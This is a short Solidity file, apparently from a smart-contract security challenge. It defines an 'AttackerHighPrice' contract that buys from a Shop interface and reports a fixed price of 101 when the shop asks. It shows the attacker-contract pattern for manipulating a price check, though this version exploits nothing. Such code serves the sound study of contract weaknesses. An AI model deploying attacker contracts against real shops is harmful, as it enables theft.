interface Shop {
    function buy() external;
    function isSold() external view returns (bool);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackerHighPrice {
    Shop private immutable shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() external view returns (uint256) {
        return 101;
    }

    function buyItem() external {
        shop.buy();
    }
}
